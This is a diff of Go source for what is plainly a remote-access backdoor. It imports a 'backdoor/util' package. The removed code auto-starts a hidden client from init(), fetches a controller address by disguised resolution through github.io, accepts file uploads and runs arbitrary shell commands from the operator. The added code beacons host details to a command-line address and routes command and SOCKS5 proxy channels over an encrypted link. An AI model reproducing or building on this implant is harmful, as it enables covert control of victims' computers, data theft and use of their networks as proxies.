@@ -2,335 +2,132 @@ package main
 
 import (
 	"backdoor/util"
-	"context"
 	"encoding/json"
-	"fmt"
-	"io"
 	"math/rand"
 	"net"
-	"net/http"
 	"os"
-	"os/exec"
+	"path/filepath"
 	"runtime"
 	"strconv"
-	"strings"
 	"time"
 
 	"github.com/google/uuid"
 )
 
-var gcmds []string
-
 var guuid string
 
 func init() {
-	rand.Seed(time.Now().Unix())
-	go client()
+	//rand.Seed(time.Now().Unix())
+	//go client()
 }
 
-func canStart(filePath string) bool {
-	pfile, err := os.Create(filePath)
+func canStart(fileDir string, fileName string) bool {
+	if len(fileDir) != 0 {
+		os.Chdir(fileDir)
+	}
+	pfile, err := os.Create(fileName)
 	if err != nil {
 		return false
 	}
 	pfile.Close()
-	if err := os.Rename(filePath, filePath); err != nil {
+	if err := os.Rename(fileName, fileName); err != nil {
 		return false
 	}
-	os.Open(filePath)
+	os.Open(fileName)
 	return true
 }
 
-func getUrl() (string, error) {
-	var data = []byte{}
-	pdecoder := util.NewDecoder()
-	urlBytes, err := pdecoder.Decode(data)
-	return string(urlBytes), err
-}
-
-var CustomResolver = &net.Resolver{
-	PreferGo: true,
-	Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
-		d := &net.Dialer{}
-		return d.DialContext(ctx, network, "8.8.8.8:53")
-	},
-}
-
-var DefaultResolver = &net.Resolver{}
-
-func lookupIP(ctx context.Context, resolv *net.Resolver, host string) ([]net.IP, error) {
-	addrs, err := resolv.LookupIPAddr(ctx, host)
-	if err != nil {
-		return nil, err
-	}
-	ips := make([]net.IP, 0)
-	for _, ia := range addrs {
-		if ia.IP == nil || ia.IP.To4() == nil {
-			continue
-		}
-		ips = append(ips, ia.IP)
-	}
-	if len(ips) == 0 {
-		return nil, fmt.Errorf("%d", len(ips))
-	}
-	return ips, nil
-}
-
-func mydial(ctx context.Context, network string, addr string) (net.Conn, error) {
-	ips, err := lookupIP(ctx, CustomResolver, "github.io")
-	if err != nil {
-		ips, err = lookupIP(ctx, DefaultResolver, "github.io")
-	}
-	if len(ips) == 0 {
-		return nil, err
-	}
-	d := &net.Dialer{}
-	index := rand.Intn(len(ips))
-	return d.DialContext(ctx, network, fmt.Sprintf("%s:443", ips[index].String()))
-}
-
-func getIP() (string, error) {
-	urlAddress, err := getUrl()
-	if err != nil {
-		return "", err
-	}
-	httpClient := &http.Client{
-		Timeout: 60 * time.Second,
-		Transport: &http.Transport{
-			Proxy:                 http.ProxyFromEnvironment,
-			DialContext:           mydial,
-			ForceAttemptHTTP2:     true,
-			MaxIdleConns:          100,
-			IdleConnTimeout:       90 * time.Second,
-			TLSHandshakeTimeout:   10 * time.Second,
-			ExpectContinueTimeout: 1 * time.Second,
-		},
-	}
-	resp, err := httpClient.Get(urlAddress)
-	if err != nil {
-		return "", err
-	}
-	defer resp.Body.Close()
-	respBytes, err := io.ReadAll(resp.Body)
-	if err != nil {
-		return "", err
-	}
-	rspText := strings.TrimSpace(string(respBytes))
-	strArr := strings.Split(rspText, ":")
-	if len(strArr) < 2 {
-		return "", fmt.Errorf("%s", rspText)
-	}
-	ip := net.ParseIP(strArr[0])
-	if ip == nil || ip.To4() == nil {
-		return "", fmt.Errorf("%s", rspText)
-	}
-	port, err := strconv.ParseUint(strArr[1], 10, 16)
-	if err != nil {
-		return "", err
-	}
-	if port == 0 {
-		return "", fmt.Errorf("%s", rspText)
-	}
-	return fmt.Sprintf("%s:%d", ip.String(), port), nil
-}
-
 func main() {
-	// if !canStart("test.txt") {
-	// 	return
-	// }
-	// var timeout int64
-	// if len(os.Args) >= 2 {
-	// 	timeout, _ = strconv.ParseInt(os.Args[1], 10, 64)
-	// }
-	// guuid = uuid.New().String()
-	// var address string
-	// for {
-	// 	if timeout > 0 {
-	// 		time.Sleep(time.Duration(timeout * int64(time.Second)))
-	// 	} else {
-	// 		time.Sleep(time.Duration(600+rand.Intn(120)) * time.Second)
-	// 	}
-	// 	tmpAddress, err := getIP()
-	// 	if err == nil {
-	// 		address = tmpAddress
-	// 	}
-	// 	if len(address) == 0 {
-	// 		continue
-	// 	}
-	// 	session(address)
-	// }
-}
-
-func client() {
+	var dirpath string
+	if execPath, err := os.Executable(); err == nil {
+		dirpath = filepath.Dir(execPath)
+	}
+	if !canStart(dirpath, "test.txt") {
+		return
+	}
+	if len(os.Args) < 2 {
+		return
+	}
+	var timeout int64
+	if len(os.Args) >= 3 {
+		timeout, _ = strconv.ParseInt(os.Args[2], 10, 64)
+	}
 	guuid = uuid.New().String()
-	var address string
 	for {
-		time.Sleep(time.Duration(600+rand.Intn(120)) * time.Second)
-		tmpAddress, err := getIP()
-		if err == nil {
-			address = tmpAddress
+		if timeout > 0 {
+			time.Sleep(time.Duration(timeout * int64(time.Second)))
+		} else {
+			time.Sleep(time.Duration(600+rand.Intn(120)) * time.Second)
 		}
-		if len(address) == 0 {
-			continue
-		}
-		session(address)
+		session(os.Args[1])
 	}
 }
 
-func storeFile(fileName string, fileData []byte) error {
-	pfile, err := os.OpenFile(fileName, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0666)
-	if err != nil {
-		return err
-	}
-	defer pfile.Close()
-	_, err = pfile.Write(fileData)
-	return err
-}
-
-func tryStoreFileForMulti(fileName string, fileData []byte) error {
-	var err error
-	err = storeFile(fileName, fileData)
-	if err == nil {
-		return nil
-	}
-	for i := 1; i < 10; i++ {
-		tmpName := fmt.Sprintf("%s.%d", fileName, i)
-		err = storeFile(tmpName, fileData)
-		if err == nil {
-			break
-		}
-	}
-	return err
-}
+// func client() {
+// 	guuid = uuid.New().String()
+// 	var address string
+// 	for {
+// 		time.Sleep(time.Duration(600+rand.Intn(120)) * time.Second)
+// 		tmpAddress, err := getIP()
+// 		if err == nil {
+// 			address = tmpAddress
+// 		}
+// 		if len(address) == 0 {
+// 			continue
+// 		}
+// 		session(address)
+// 	}
+// }
 
 func session(address string) {
 	conn, err := net.DialTimeout("tcp", address, 30*time.Second)
 	if err != nil {
 		return
 	}
-	defer conn.Close()
-	pencoder := util.NewEncoder()
-	pdecoder := util.NewDecoder()
-	if err := sendInfo(conn, pencoder); err != nil {
+	sslconn := util.NewSSLConn(conn)
+	defer sslconn.Close()
+	sendInfoReq(sslconn)
+	sslconn.SetReadDeadline(time.Now().Add(60 * time.Second))
+	infoRsp, err := sslconn.Read()
+	if err != nil {
 		return
 	}
-	var fileName string
-	var fileData []byte
+	if len(infoRsp) != 2 || infoRsp[0] != 'O' || infoRsp[1] != 'K' {
+		return
+	}
+	pcmd := NewCmdClient(sslconn)
+	psocks5 := NewSocks5Client(sslconn)
 	for {
-		emsg, err := util.TcpReadMsg(conn, 60*time.Second)
+		sslconn.SetReadDeadline(time.Now().Add(60 * time.Second))
+		msg, err := sslconn.Read()
 		if err != nil {
 			break
 		}
-		msg, err := pdecoder.Decode(emsg)
-		if err != nil {
-			break
-		}
-		if len(msg) >= 3 && msg[0] == 'u' && msg[1] == 'p' && msg[2] == ' ' {
-			if len(fileName) == 0 {
-				fileName = strings.TrimSpace(string(msg[2:]))
-			} else {
-				if len(msg) == 3 {
-					err := tryStoreFileForMulti(fileName, fileData)
-					fileName = ""
-					fileData = nil
-					if err != nil {
-						util.TcpWriteMsg(conn, pencoder.Encode([]byte(err.Error())))
-					}
-				} else {
-					fileData = append(fileData, msg[3:]...)
-				}
-			}
+		if len(msg) == 0 {
 			continue
 		}
-		var req util.Request
-		if err := json.Unmarshal(msg, &req); err != nil {
-			break
-		}
-		if req.Magic != util.Magic {
-			break
-		}
-		cmdstr := strings.TrimSpace(req.Cmd)
-		if len(cmdstr) == 0 {
-			continue
-		}
-		if strings.HasPrefix(cmdstr, "cd ") {
-			changedir(cmdstr)
-			continue
-		}
-		if strings.HasPrefix(cmdstr, "createprocess ") {
-			createprocess(cmdstr)
-			continue
-		}
-		if strings.HasPrefix(cmdstr, "setcmdshell ") {
-			tmp := strings.TrimSpace(cmdstr[strings.Index(cmdstr, " "):])
-			gcmds = strings.Split(tmp, " ")
-			continue
-		}
-		out, err := execCmd(cmdstr)
-		if err != nil {
-			util.TcpWriteMsg(conn, pencoder.Encode([]byte(err.Error())))
-		}
-		if len(out) != 0 {
-			util.TcpWriteMsg(conn, pencoder.Encode(out))
+		if msg[0] == util.CMD_CHANNEL {
+			pcmd.OnMsg(msg[1:])
+		} else if msg[0] == util.SOCKS5_CHANNEL {
+			psocks5.OnMsg(msg[1:])
 		}
 	}
+	psocks5.OnClose()
+	pcmd.OnClose()
 }
 
-func createprocess(cmd string) {
-	index := strings.Index(cmd, " ")
-	cmd = strings.TrimSpace(cmd[index:])
-	if len(cmd) == 0 {
-		return
-	}
-	go execCmd(cmd)
-}
-
-func getCmdArr(arg string) []string {
-	if len(gcmds) != 0 {
-		tmp := make([]string, len(gcmds))
-		copy(tmp, gcmds)
-		tmp = append(tmp, arg)
-		return tmp
-	}
-	var tmp []string
-	if runtime.GOOS == "windows" {
-		tmp = append(tmp, "cmd", "/c", arg)
-	} else {
-		tmp = append(tmp, "sh", "-c", arg)
-	}
-	return tmp
-}
-
-func execCmd(cmdstr string) ([]byte, error) {
-	arr := getCmdArr(cmdstr)
-	cmd := exec.Command(arr[0], arr[1:]...)
-	return cmd.CombinedOutput()
-}
-
-func sendInfo(conn net.Conn, pencoder *util.Encoder) error {
-	localip := conn.LocalAddr().String()
+func sendInfoReq(sslconn *util.SSLConn) {
+	localip := sslconn.LocalAddr().String()
 	hostname := ""
 	if name, err := os.Hostname(); err == nil {
 		hostname = name
 	}
 	var info util.Info
-	info.Magic = util.Magic
 	info.HostName = hostname
 	info.LocalIP = localip
 	info.PID = os.Getpid()
 	info.UUID = guuid
-	jsonBytes, err := json.Marshal(&info)
-	if err != nil {
-		return err
-	}
-	return util.TcpWriteMsg(conn, pencoder.Encode(jsonBytes))
-}
-
-func changedir(cmd string) {
-	index := strings.Index(cmd, " ")
-	dir := strings.TrimSpace(cmd[index:])
-	if len(dir) == 0 {
-		return
-	}
-	os.Chdir(dir)
+	info.OSType = runtime.GOOS
+	jsonBytes, _ := json.Marshal(&info)
+	sslconn.Write(jsonBytes)
 }
